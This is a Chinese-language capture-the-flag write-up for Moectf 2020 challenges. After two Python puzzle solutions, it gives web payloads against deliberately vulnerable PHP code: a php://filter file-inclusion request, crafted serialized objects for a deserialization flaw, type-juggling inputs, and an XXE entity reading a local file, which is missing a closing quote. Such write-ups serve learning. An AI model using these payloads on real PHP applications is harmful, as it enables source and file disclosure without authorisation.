---
title: '【Moectf】部分题解'
date: 2020-08-13T17:18:05+01:00
tags: [ctf]
---

# 【Moectf】Writeup

<a name="Z3qca"></a>
## Algorithm mess
<a name="pmqd2"></a>
### 0x 00 题
puzzle.py:
```python
import random
flag = 'moectf{xxxxxxxxxxx}'
digit = ''

for i in flag:
    digit += str(ord(i))
i = 0
while i < len(digit):
    n = random.randint(0, 128)
    if ord('a') <= n <= ord('z') or ord('A') <= n <= ord('Z'):
        digit = digit[0:i] + chr(n) + digit[i:]
    i += 1

with open('puzzle1.txt', 'w') as out:
    out.write(digit)

```
puzzle.txt:
```
1091111A01ruVJl99hw11Qv6i102xCYC1c2B31DIsz1tm212l11A1l610448re11BQ09549115951n154V895F115d49109h1m1210810j11w2A5
```
<a name="iVLJ6"></a>
### 0x 01 构思
原题的加密方案为：将一段明文转换为ASCII码数字，并组合为一串数字字符串。<br />//此步解题难点在于有意义的分组数字混合为无意义无分组的数字字符串，解密时需要分割为各字符的ASCII码<br />接下来虽然用到随机数模块，但其实是循环生成字母并插入到上述数字字符串中；抓住要点：字符 插入 数字字符串<br />也就是解密时把数字字符串中的所有字母过滤即可得到原先的数字字符串<br />这里我偷懒了，看了一眼ASCII码表，'!' 及以下的字符一般都不会涉及。所以直接 stri >= '!' ，就算有偏差，也可以手工修正
<a name="ppqsq"></a>
### 0x 02 撰写解题脚本
```python
codec = '1091111A01ruVJl99hw11Qv6i102xCYC1c2B31DIsz1tm212l11A1l610448re11BQ09549115951n154V895F115d49109h1m1210810j11w2A5'

encoded = ''
for i in codec:
   if not('a' <= i <= 'z' or 'A' <= i <= 'Z'):
        encoded += i

i=0
j=2
decoded=''
while j<=len(encoded):
    stri = chr(int(encoded[i:j]))
    #'a' <= stri <= 'z' or 'A' <= stri <= 'Z' or stri=='{'or stri=='}' or stri=='_' or '0'<=stri or stri <='9'
    #原来的判断条件，很蠢
    if stri>='!': 
        decoded+=stri
        i=j
        j=j+2
    elif j-i<=3:
        j+=1
    else:
        continue

print(decoded)
```
<a name="WYfKe"></a>
## 赤道企鹅,永远滴神
附件：<br />[https://moectf.online/files/843310771533a96dc458afb1cd37344d/puzzle.tar.gz?token=eyJ1c2VyX2lkIjo4MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Mjh9.XzfYKQ.a1xJhhxTMIQCuyCplek2J9lGV70](https://moectf.online/files/843310771533a96dc458afb1cd37344d/puzzle.tar.gz?token=eyJ1c2VyX2lkIjo4MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Mjh9.XzfYKQ.a1xJhhxTMIQCuyCplek2J9lGV70)<br />[https://moectf.online/files/8b557004618130a4b1b07deed8b40967/puzzle.py?token=eyJ1c2VyX2lkIjo4MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Mjl9.XzfYKQ.Z-7gYaI3rsR1mrsBhyw5DlzV290](https://moectf.online/files/8b557004618130a4b1b07deed8b40967/puzzle.py?token=eyJ1c2VyX2lkIjo4MywidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6Mjl9.XzfYKQ.Z-7gYaI3rsR1mrsBhyw5DlzV290)<br />

```python
import os
keyWord = 'EqqieNB!'
Sum=0
rootdir = './puzzle'
def isIntOrAlpha(i):
    if ('a'<=i and i<='z') or ('A'<=i and i<='Z') or ('0'<=i and i<='9'):
        return True
    else:
        return False
def strCounter(wd):
    allStr = []
    oneStr = ''
    for i in wd:
        if isIntOrAlpha(i):
            oneStr+=i 
        elif oneStr!='':
            allStr.append(oneStr)
            oneStr=''
        else:
            continue
    if isIntOrAlpha(wd[-1]):
        allStr.append(oneStr)
    return len(allStr)
#用os.walk更简洁，但是时间复杂度没有改观
dir1s = os.listdir(rootdir)
for dir1 in dir1s:
    for dir2 in os.listdir(rootdir+'/'+dir1):
        for dir3 in os.listdir(rootdir+'/'+dir1+'/'+dir2):
            with open(rootdir+'/'+dir1+'/'+dir2+'/'+dir3+'/'+dir3+'.txt') as txt:
                words = txt.read()
                if words[:8]==keyWord:
                    Sum += strCounter(words[8:])
                else:
                    continue

print(Sum)
```
<a name="bf11fb7e"></a>
## web/Moe include
hint.php提示使用伪协议，那就读一下index.php<br />**web.moectf.online/include/?file=php://filter/read=convert.base64-encode/resource=index.php**
```php
<?php
error_reporting(0);
$file = $_GET["file"];
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")) {
	exit('get out!');
}
if($file){
  include($file);
}
else{
  echo '<a href="?file=hint.php">do not click</a>';
?>
```
if(stristr($file,"php://input") || stristr($file,"zip://") || stristr($file,"phar://") || stristr($file,"data:")<br />表示过滤这些伪协议<br />

<a name="uJLE8"></a>
## web/Moe unserialize
```php
<?php
error_reporting(0);
class Moe {
    public $a;
    protected $b;
    private $c;

    function __destruct() {
        if ($this->a === '1' && $this->b === '2' && $this->c === '3') {
            include 'flag.php';
            die($flag);
        }
    }
}
$moe = $_GET['flag'];
unserialize($moe);
?>
有一天，赤道企鹅在愉快的使用vim给学弟挖坑，突然伴随着身体的一阵抽搐，电脑死机了。企鹅悲痛欲绝，聪明的你能帮助企鹅找到他挖的坑吗？
```
反序列化漏洞成因<br />[https://www.cnblogs.com/ichunqiu/p/10484832.html](https://www.cnblogs.com/ichunqiu/p/10484832.html)<br />构造反序列化脚本
```php
<?php
class Moe {
    public $a = '1';
    protected $b = '2';
    private $c = '3';
}
$a = serialize(new Moe);
echo $a;
?>
```
得到序列化字符串
```php
O:3:"Moe":3:{s:1:"a";s:1:"1";s:4:"*b";s:1:"2";s:6:"Moec";s:1:"3";}
```
不能过验证，因为b 和 c 是protected和private变量.可以观察上面的格式化字符串中三个变量的不同。<br />$a 是public变量，没有任何 修饰<br />$b 是protected变量，前面加了 '*'<br />$c 是private 变量，前面加了 类名 'Moe' <br />/所以猜测 protected变量的序列化标记就是'*',private变量的序列化标记就是这个“私人”变量的所有者<br />PHP中%00起到截断作用 %00二进制ASCII码转为字符含义就是null<br />（在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束）<br />所以用%00包裹这两个标识/        此处存疑
```php
O:3:"Moe":3:{s:1:"a";s:1:"1";s:4:"%00*%00b";s:1:"2";s:6:"%00Moe%00c";s:1:"3";}
```
<a name="WJsrr"></a>
## web/三心二意
```php
<?php
$a = $_GET['a'];
$b = $_POST['b'];
$c = $_REQUEST['c'];
$d = $_COOKIE['d'];

if (!isset($a, $b, $c, $d)) {
    highlight_file(__FILE__);
} else {
    if (is_numeric($a) and $a == false) {
        echo 'A is OK!';
        echo '<br/>';
        if (!is_numeric($b) and $b == 0x125e591) {
            echo 'B is OK!';
            echo '<br/>';
            if ($c != 240610708 and md5($c) == md5(240610708)) {
                echo 'C is OK!';
                echo '<br/>';
                if (strlen($d) < 7 and $d != 0 and $d ** 2 == 0) {
                    include('/flag');
                } else {
                    echo "D is not wanted.<br/>";
                    highlight_file(__FILE__);
                }
            } else {
                echo "C is not wanted.<br/>";
                highlight_file(__FILE__);
            }
        } else {
            echo "Too young too simple.<br/>";
            highlight_file(__FILE__);
        }
    } else {
        echo "A is not wanted.<br/>";
        highlight_file(__FILE__);
    }
}
```
a 和 c都很好构造<br />[http://39.97.238.171:8002/?a=0&c=QNKCDZO](http://39.97.238.171:8002/?a=0&c=QNKCDZO)<br />b需要先转换成十进制，然后利用弱类型比较<br />b=19260817a<br />转换成十进制可能是因为最后加入的字母会和前面的一起被看成是字母而不是十六进制数字<br />d 是最骚的<br />d[]=''<br />
<br />

<a name="JQGiX"></a>
## web/ezXXE
题目：
```php
<?php
// flag is in '/flags/flag1.txt' and '/flags/flag2.php'

libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');

if (strpos($xmlfile,"flag1.txt") !== FALSE){
    if (strpos($xmlfile,'file:/') === FALSE){
        die("Please use file protocol.<br/><br/>");
    }
}
if (strpos($xmlfile,"flag2.php") !== FALSE){
    if (strpos($xmlfile,'file:/') !== FALSE){
        echo "Why not try php://filter?";
        echo '<br/><br/>';
    }
}

$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
$test = simplexml_import_dom($dom);
echo $test;
highlight_file(__FILE__);
?>
```
[https://xz.aliyun.com/t/3357](https://xz.aliyun.com/t/3357)<br />payload:
```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE test [  
<!ENTITY pay SYSTEM "file:///flags/flag1.txt> ]> 
<test>&pay;</test>
```
